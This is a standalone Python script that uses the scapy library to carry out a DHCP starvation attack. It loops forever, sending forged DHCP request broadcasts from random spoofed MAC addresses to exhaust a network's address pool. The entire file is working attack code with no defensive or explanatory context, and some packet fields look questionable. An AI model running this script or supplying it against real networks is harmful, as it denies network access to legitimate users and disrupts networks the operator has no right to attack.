from scapy.all import *
import random

def random_mac():
    return ':'.join(['%02x' % random.randint(0, 255) for _ in range(6)])

def dhcp_starvation(iface):
    while True:
        fake_mac = random_mac()
        dhcp_request = (
            Ether(src=fake_mac, dst='ff:ff:ff:ff:ff:ff') /
            IP(src='0.0.0.0', dst='255.255.255.255') /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=[fake_mac]) /
            DHCP(options=[
                ('message-type', 'request'),
                ('server_id', '0.0.0.0'),
                ('requested_addr', '0.0.0.0'),
                'end'
            ])
        )
        sendp(dhcp_request, iface=iface, verbose=False)

if __name__ == "__main__":
    iface = 'eth0'
    dhcp_starvation(iface)
